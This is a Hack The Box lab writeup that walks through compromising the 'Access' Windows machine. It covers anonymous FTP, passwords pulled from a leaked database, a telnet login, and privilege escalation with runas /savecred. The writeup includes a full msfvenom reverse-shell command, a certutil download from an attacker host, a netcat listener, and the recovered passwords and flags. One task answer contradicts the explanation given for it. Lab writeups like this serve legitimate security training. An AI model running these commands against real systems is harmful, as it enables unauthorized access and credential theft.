Today we will tackle access machine on Hackthebox. So without further ado, let's jump on straight into the action.

As usual, we will set the target variable for ease of use.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ export target=10.129.3.164
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ ping $target
PING 10.129.3.164 (10.129.3.164) 56(84) bytes of data.
64 bytes from 10.129.3.164: icmp_seq=1 ttl=127 time=7.68 ms
64 bytes from 10.129.3.164: icmp_seq=2 ttl=127 time=7.89 ms
```

Task 1: How many TCP ports are listening on Access?

Let's run an nmap scan to see what ports are open and what services are running.

Normally I add the -sV and -sC flags to gain some extra information and -p- to make sure all ports are probed. This usually takes a minute or two, but at least we can be confident that we have not missed important information.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ nmap -sV -sC $target -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-25 01:47 CDT
Nmap scan report for 10.129.3.164
Host is up (0.0071s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.15 seconds
```

So we have our first answer, and that is 3 tcp ports (21,23,80).

Answer: 80

Task 2: What is the filename for the Microsoft Access database available on the host?

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ ftp $target
Connected to 10.129.3.164.
220 Microsoft FTP Service
Name (10.129.3.164:root):
331 Password required for root.
Password:
530 User cannot log in.
ftp: Login failed
ftp> ls
530 Please login with USER and PASS.
530 Please login with USER and PASS.
ftp: Can't bind for data connection: Address already in use
ftp> user anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************|  5520 KiB   16.29 MiB/s    00:00 ETA
226 Transfer complete.
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
5652480 bytes received in 00:00 (16.28 MiB/s)
ftp> cd ..
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> get Engineer
local: Engineer remote: Engineer
200 PORT command successful.
550 Access is denied.
ftp> cd Engineer
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************| 10870      470.95 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
10870 bytes received in 00:00 (463.30 KiB/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
```

I also tried to login via telnet default/anonymous credentials but no luck.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ telnet $target
Trying 10.129.3.164...
Connected to 10.129.3.164.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: admin
password:
The handle is invalid.

Login Failed

login: root
password:
The handle is invalid.

Login Failed

login: anonymous
password:
The handle is invalid.

Login Failed

Telnet Server has closed the connection
Connection closed by foreign host.
```

The answer for task 3 is the file found on the Backup folder in the ftp server.

Answer: backup.mdb

Now that we have a database, let's try to see how can we read some data from it.
After doing some research online, .mdb files are legacy microsoft database files and there is a tool on linux just for that called mdbtools.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ sudo apt update
sudo apt install mdbtools
Hit:1 https://deb.parrot.sh/parrot lory InRelease
Hit:2 https://deb.parrot.sh/direct/parrot lory-security InRelease
Hit:3 https://deb.parrot.sh/parrot lory-backports InRelease
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
99 packages can be upgraded. Run 'apt list --upgradable' to see them.
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
mdbtools is already the newest version (1.0.0+dfsg-1.1).
The following packages were automatically installed and are no longer required:
  espeak-ng-data fonts-open-sans geany-common libamd2 libbabl-0.1-0
  libbrlapi0.8 libc++1-16 libc++abi1-16 libcamd2 libccolamd2
  libcharon-extauth-plugins libcholmod3 libdaxctl1 libdotconf0 libept1.6.0
  libespeak-ng1 libgegl-0.4-0 libgegl-common libgimp2.0 libjsoncpp25 libmetis5
  libmng1 libmypaint-1.5-1 libmypaint-common libndctl6 libpcaudio0 libpmem1
  libsonic0 libspeechd2 libstrongswan libstrongswan-standard-plugins
  libtorrent-rasterbar2.0 libumfpack5 libunwind-16 libwmf-0.2-7 libwpe-1.0-1
  libwpebackend-fdo-1.0-1 libxapian30 node-clipboard node-prismjs
  python-pkginfo-doc python3-brlapi python3-cachecontrol python3-cleo
  python3-crashtest python3-distlib python3-dulwich python3-fastimport
  python3-filelock python3-jaraco.classes python3-jeepney python3-keyring
  python3-lockfile python3-louis python3-pkginfo python3-platformdirs
  python3-poetry python3-poetry-core python3-pyatspi python3-pylev
  python3-secretstorage python3-shellingham python3-speechd python3-tomlkit
  python3-virtualenv python3-wheel-whl sound-icons
  speech-dispatcher-audio-plugins strongswan strongswan-charon
  strongswan-libcharon strongswan-starter webext-privacy-badger xbrlapi xkbset
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 99 not upgraded.
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ mdb-tables --version
mdbtools v1.0.0
```

More documentation can be found here: https://mdbtools.github.io/utils/

We will use mdb-tables for now as we are looking to list all tables inside this file.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ mdb-tables backup.mdb
offset 7585302654976 is beyond EOF
Unable to bind columns from table MSysObjects (17 columns found)
File does not appear to be an Access database
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ mdb-sql backup.mdb
1 => list tables;
offset 7585302654976 is beyond EOF
Unable to bind columns from table MSysObjects (17 columns found)
+------------------------------+
|Tables                        |
+------------------------------+
+------------------------------+
No Rows retrieved
1 =>

┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ file backup.mdb
backup.mdb: Microsoft Access Database
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ strings backup.mdb | head
Standard Jet DB
gr@?
y[2*|*
OJmJJMMQkkfJUQk
OJmJLJkQk
Sdi`k
`dOo^Qk
iQ^JmYdbkWYfk
iQfdimk
kMiYfmk

┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ ftp $target
Connected to 10.129.3.164.
220 Microsoft FTP Service
Name (10.129.3.164:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |***********************************|  5520 KiB   16.78 MiB/s    00:00 ETA
226 Transfer complete.
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
5652480 bytes received in 00:00 (16.78 MiB/s)
ftp> binary
200 Type set to I.
ftp> get backup.mdb goodbackup.mdb
local: goodbackup.mdb remote: backup.mdb
200 PORT command successful.
150 Opening BINARY mode data connection.
100% |***********************************|  5520 KiB   16.17 MiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:00 (16.17 MiB/s)
ftp>

```

After doing some troubleshooting, I gone back to the ftp service to re-download the file as I initially thought that maybe the first try something wrong happened. So when I googled the ftp error I learned that I downloaded the database as ASCII hence I cound not open it. I never came across this issue before and I assumed ftp will download the original file type not convert it in ASCII but here we are, we learn something new everyday.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ mdb-tables goodbackup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
```

Perfect, now we actually have some information to work with, let's try some other commands to see if we can find the passwords required.

Let's run a simple bash script to list all tables and the columns for each. We will use mdb-tables to list them and mdb-export to see the output for each table.

```
for table in $(mdb-tables -1 goodbackup.mdb);
do echo "---$table---"
mdb-export goodbackup.mdb "$table"
done
```

Pretty simple, but we have some considerable output so let's narrow this down.

```
for table in $(mdb-tables -1 goodbackup.mdb);
do echo "---$table---"
mdb-export goodbackup.mdb "$table"
done | tee output.txt | grep -i -B 1 password
```

We first loop through the tables and print each with their respective table columns. We store that inside output.txt file and we filter using grep. Since the table name is what we need, we will also print one line before the match using '-B 1' flag.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ for table in $(mdb-tables -1 goodbackup.mdb);
do echo "---$table---"
mdb-export goodbackup.mdb "$table"
done | tee output.txt | grep -i -B 1 password
---auth_user---
id,username,password,Status,last_login,RoleID,Remark
--
---Machines---
ID,ConnectType,IP,SerialPort,Port,Baudrate,MachineNumber,IsHost,Enabled,CommPassword,UILanguage,DateFormat,InOutRecordWarn,Idle,Voice,managercount,fingercount,SecretCount,ProductType,LockControl,Purpose,ProduceKind,sn,PhotoStamp,IsIfChangeConfigServer2,pushver,change_operator,change_time,create_operator,create_time,delete_operator,delete_time,status,device_type,last_activity,trans_times,TransInterval,log_stamp,oplog_stamp,photo_stamp,UpdateDB,device_name,transaction_count,main_time,max_user_count,max_finger_count,max_attlog_count,alg_ver,flash_size,free_flash_size,language,lng_encode,volume,is_tft,platform,brightness,oem_vendor,city,AccFun,TZAdj,comm_type,agent_ipaddress,subnet_mask,gateway,area_id,acpanel_type,sync_time,four_to_two,video_login,fp_mthreshold,Fpversion,max_comm_size,max_comm_count,realtime,delay,encrypt,dstime_id,door_count,reader_count,aux_in_count,aux_out_count,IsOnlyRFMachine,alias,ipaddress,com_port,com_address,DeviceNetmask,DeviceGetway,SimpleEventType,FvFunOn,fvcount,deviceOption,DevSDKType,UTableDesc,IsTFTMachine,PinWidth,UserExtFmt,FP1_NThreshold,FP1_1Threshold,Face1_NThreshold,Face1_1Threshold,Only1_1Mode,OnlyCheckCard,MifireMustRegistered,RFCardOn,Mifire,MifireId,NetOn,RS232On,RS485On,FreeType,FreeTime,NoDisplayFun,VoiceTipsOn,TOMenu,StdVolume,VRYVH,KeyPadBeep,BatchUpdate,CardFun,FaceFunOn,FaceCount,TimeAPBFunOn,FirmwareVersion,FingerFunOn,CompatOldFirmware,ParamValues,WirelessSSID,WirelessKey,WirelessAddr,WirelessMask,WirelessGateWay,IsWireless,ACFun,BiometricType,BiometricVersion,BiometricMaxCount,BiometricUsedCount,WIFI,WIFIOn,WIFIDHCP,MachineAlias,usercount
--
---USERINFO---
USERID,Badgenumber,SSN,Gender,TITLE,PAGER,BIRTHDAY,HIREDDAY,street,CITY,STATE,ZIP,OPHONE,FPHONE,VERIFICATIONMETHOD,DEFAULTDEPTID,SECURITYFLAGS,ATT,INLATE,OUTEARLY,OVERTIME,SEP,HOLIDAY,MINZU,PASSWORD,LUNCHDURATION,PHOTO,mverifypass,Notes,privilege,InheritDeptSch,InheritDeptSchClass,AutoSchPlan,MinAutoSchInterval,RegisterOT,InheritDeptRule,EMPRIVILEGE,CardNo,change_operator,change_time,create_operator,create_time,delete_operator,delete_time,status,lastname,AccGroup,TimeZones,identitycard,UTime,Education,OffDuty,DelTag,morecard_group_id,set_valid_time,acc_startdate,acc_enddate,birthplace,Political,contry,hiretype,email,firedate,isatt,homeaddress,emptype,bankcode1,bankcode2,isblacklist,Iuser1,Iuser2,Iuser3,Iuser4,Iuser5,Cuser1,Cuser2,Cuser3,Cuser4,Cuser5,Duser1,Duser2,Duser3,Duser4,Duser5,reserve,name,OfflineBeginDate,OfflineEndDate,carNo,carType,carBrand,carColor
```

Answer: auth_user

Now that we have the table that we need, let's read its contents.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-lijolakxep]─[~]
└──╼ [★]$ mdb-export goodbackup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Task 4: What is the password for Access Control.zip?

Since we know that inside the ftp server, the access control zip file was inside engineer folder, we can use deductive reasoning that the password is the one inside the auth table.

Answer: access4u@security

Now we have access to the access control list.

Task 4: What is the password for Access Control.zip?

Here I had some trouble installing the required packages to read .pst files. So I moved to my local kali box to continue the challenge.

```
┌──(ciupi㉿kali)-[~/Downloads]
└─$ 7z x Access\ Control.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_GB.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870


Enter password (will not be echoed):"password from previous question"
Everything is Ok

Size:       271360
Compressed: 10870
```

```
┌──(ciupi㉿kali)-[~/Desktop]
└─$ readpst "Access Control.pst"
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.

┌──(ciupi㉿kali)-[~/Desktop]
└─$ ls
'Access Control.mbox'   chall.jpg        formular.xlsx     ligma        xxe
'Access Control.pst'    forensics-disk   Install-DVWA.sh   script.php
```

Now we can read the mailbox that was inside the zip.

┌──(ciupi㉿kali)-[~/Desktop]
└─$ cat Access\ Control.mbox
From "john@megacorp.com" Fri Aug 24 00:44:07 2018
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
boundary="--boundary-LibPST-iamunique-613352805*-*-"

----boundary-LibPST-iamunique-613352805*-*-
Content-Type: multipart/alternative;
boundary="alt---boundary-LibPST-iamunique-613352805*-*-"

--alt---boundary-LibPST-iamunique-613352805*-*-
Content-Type: text/plain; charset="utf-8"

Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to your engineers.

Regards,

John

```

Answer: 4Cc3ssC0ntr0ller

```

Task 6: To which open TCP port on Access can we connect to get a shell after logging in as security?

Here the answer is pretty straightforward as we only have 3 services running on this machine. The one we have just enumerated is 21-ftp server, we have 23-telnet and 80-http.
Telnet is an older network protocol used to remotely access and communicate with other machines. It is considered insecure because it sends data in plaintext. SSH was developed as a secure replacement for Telnet. Also, taking into account what have we worked with so far (the legacy microsoft db), it all ties up.

Answer:23

```
┌──(ciupi㉿kali)-[~/Desktop]
└─$ telnet $target
Trying 10.129.3.164...
Connected to 10.129.3.164.
Escape character is '^]'.
Welcome to Microsoft Telnet Service

login: security
password:

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security

08/23/2018  11:52 PM    <DIR>          .
08/23/2018  11:52 PM    <DIR>          ..
08/24/2018  08:37 PM    <DIR>          .yawcam
08/21/2018  11:35 PM    <DIR>          Contacts
08/28/2018  07:51 AM    <DIR>          Desktop
08/21/2018  11:35 PM    <DIR>          Documents
08/21/2018  11:35 PM    <DIR>          Downloads
08/21/2018  11:35 PM    <DIR>          Favorites
08/21/2018  11:35 PM    <DIR>          Links
08/21/2018  11:35 PM    <DIR>          Music
08/21/2018  11:35 PM    <DIR>          Pictures
08/21/2018  11:35 PM    <DIR>          Saved Games
08/21/2018  11:35 PM    <DIR>          Searches
08/24/2018  08:39 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   3,346,677,760 bytes free

C:\Users\security>cd Desk
The system cannot find the path specified.

C:\Users\security>cd Desktop

C:\Users\security\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security\Desktop

08/28/2018  07:51 AM    <DIR>          .
08/28/2018  07:51 AM    <DIR>          ..
05/25/2026  07:41 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,346,677,760 bytes free

C:\Users\security\Desktop>type user.txt
67eb4acf4691632b3c78e81bc22b9d0c
```

Telnet shell is a bit sensitive and you cannot mis-type...So make sure you get it right the first time.

Task 7: Submit the flag located on the security user's desktop.
Answer: 67eb4acf4691632b3c78e81bc22b9d0c

Task 8: What is the name of the executable called by the link file on the Public desktop?

Inside the same telnet shell, let's change directory and find the answer.

```
C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)   3,346,677,760 bytes free

```

Task 8: What is the name of the executable called by the link file on the Public desktop?

```
C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows��:�␦M�:*wWindowsV1MV�System32��:�␦MV�*�System32X2P�:�
              runas.exe��:1��:1�*Yrunas.exeL-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
                                                                                  �wN�␦�]N�D.��Q���`�Xaccess�_���8{E�3
                            O�j)�H���
                                     )ΰ[�_���8{E�3
                                                  O�j)�H���
                                                           )ΰ[�	��1SPS�XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
```

Answer: runas.exe

Task 9: What Windows command, when given the /list option, will print information about the stored credentials available to the current user?

```
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Answer: cmdkey

Task 10: What option can be given to the runas Windows command to have it use the saved credentials and run as that user? Include the leading /.

Answer: /savecred (can be found in the above-mentioned link file)

Here we can see through the obfuscated data that this link is calling an executable in System32 and it is given an executable to run as administrator. It seems that this configuration is made for a low-privilege account to run administrator privilege using the stored credentials.

```
runas.exeL-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico
```

So we should be able to execute the same command that grants administrator privilege but instead of using it to open the executable that was meant to be used, we will execute our malicious reverse shell executable.

I decided to go ahead and upload a malicious executable using msfvenom module using this very helpful website. https://www.revshells.com/

On my local machine I ran:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.65 LPORT=4444 -f exe -o reverse.exe
```

For some reason, the upload would simply not work on my kali, so I restarted the machine and jumped back on the pwnbox provided by HTB.

Start your listener and let's upload the executable.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-xmzqpzsdqd]─[~/Documents]
└──╼ [★]$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.3.214 - - [25/May/2026 06:28:13] "GET /reverse.exe HTTP/1.1" 200 -
10.129.3.214 - - [25/May/2026 06:28:16] "GET /reverse.exe HTTP/1.1" 200 -
```

```
C:\temp>certutil.exe -urlcache -split -f http://10.10.14.65:8000/reverse.exe reverse.exe
****  Online  ****
  0000  ...
  1c00
CertUtil: -URLCache command completed successfully.

C:\temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\temp

05/25/2026  12:28 PM    <DIR>          .
05/25/2026  12:28 PM    <DIR>          ..
08/21/2018  11:25 PM    <DIR>          logs
05/25/2026  12:28 PM             7,168 reverse.exe
08/21/2018  11:25 PM    <DIR>          scripts
08/21/2018  11:25 PM    <DIR>          sqlsource
               1 File(s)          7,168 bytes
               5 Dir(s)   3,349,905,408 bytes free
```

Perfect, now we have our reverse shell uploaded and we have the command to run it as an administrator. Let's set up a local listener for our reverse shell command.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-xmzqpzsdqd]─[~/Documents]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
```

Move the executable from temp to the desktop of security user and run the runas executable with the reverse shell argument.

```
C:\temp>move reverse.exe c:\users\security\desktop
        1 file(s) moved.

C:\Users\security\Desktop>runas.exe /user:ACCESS\Administrator /savecred "reverse.exe"
```

Now back to our netcat listener, we have received a shell with administrator privileges.

```
┌─[eu-dedivip-3]─[10.10.14.65]─[ciupi@htb-xmzqpzsdqd]─[~/Documents]
└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.65] from (UNKNOWN) [10.129.3.214] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Perfect, now all we have left to do is to grab the root flag!

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
54135c425ee59f08a05c51a66471f1e3
```

This machine can be further exploited using mimikatz module for credential theft.
